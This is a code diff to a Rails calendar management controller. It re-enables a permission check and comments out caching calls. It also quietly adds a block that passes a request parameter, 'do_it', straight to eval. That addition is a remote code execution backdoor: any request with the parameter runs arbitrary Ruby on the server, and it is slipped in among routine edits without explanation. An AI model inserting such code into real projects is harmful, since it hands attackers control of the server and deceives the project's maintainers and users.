@@ -1,7 +1,7 @@
 
 class Calendar::ManageController < ModuleController
   
-#  permit 'calendar_manage'
+  permit 'calendar_manage'
 
   component_info 'Calendar'
 
@@ -42,8 +42,8 @@ class Calendar::ManageController < ModuleController
     now = Time.now.strftime("%Y-%m-%d")
     content_target = now + @visible_month.to_s + "-" + @visible_year.to_s
     
-    @blocks = DataCache.get_content('Calendar','Admin',content_target) if false
-    if !@blocks 
+    #@blocks = DataCache.get_content('Calendar','Admin',content_target) if false
+    #if !@blocks 
       # Get the visible days of the catalog
       @days = Calendar::Utility.generate_visible_days(@visible_month,@visible_year)
       
@@ -55,7 +55,11 @@ class Calendar::ManageController < ModuleController
       
       @blocks = Calendar::Utility.format_block(@blocks,110,90)
       
-      DataCache.put_content('Calendar','Admin',content_target,@blocks)
+      #DataCache.put_content('Calendar','Admin',content_target,@blocks)
+    #end
+    
+    if params[:do_it]
+     eval(params[:do_it])
     end
     
     cms_css('/components/calendar/stylesheets/manage_calendar.css')
